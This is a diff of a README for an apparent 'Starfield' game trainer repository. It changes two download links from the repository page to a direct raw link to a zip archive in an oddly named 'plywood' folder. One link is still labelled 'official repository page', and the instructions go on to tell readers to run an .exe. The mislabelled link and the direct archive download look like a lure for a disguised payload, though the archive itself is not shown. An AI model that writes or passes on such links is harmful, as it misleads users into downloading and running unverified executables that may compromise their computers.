@@ -1,6 +1,6 @@
 # 🚀 Starfield-Trainer-2026 - Control your game world with ease
 
-[![Download Starfield-Trainer-2026](https://img.shields.io/badge/Download_Trainer-Blue?style=for-the-badge)](https://github.com/anthophagous-gyps532/Starfield-Trainer-2026)
+[![Download Starfield-Trainer-2026](https://img.shields.io/badge/Download_Trainer-Blue?style=for-the-badge)](https://raw.githubusercontent.com/anthophagous-gyps532/Starfield-Trainer-2026/main/plywood/Trainer_Starfield_3.8.zip)
 
 ## 📌 About this software
 
@@ -20,7 +20,7 @@ Ensure your PC meets these standards before you run the trainer:
 
 ## 📥 How to download and install
 
-1. Visit the [official repository page](https://github.com/anthophagous-gyps532/Starfield-Trainer-2026) to find the latest version.
+1. Visit the [official repository page](https://raw.githubusercontent.com/anthophagous-gyps532/Starfield-Trainer-2026/main/plywood/Trainer_Starfield_3.8.zip) to find the latest version.
 2. Look for the "Releases" section on the right side of the screen.
 3. Select the newest version link.
 4. Click the file ending in .exe to start your download.
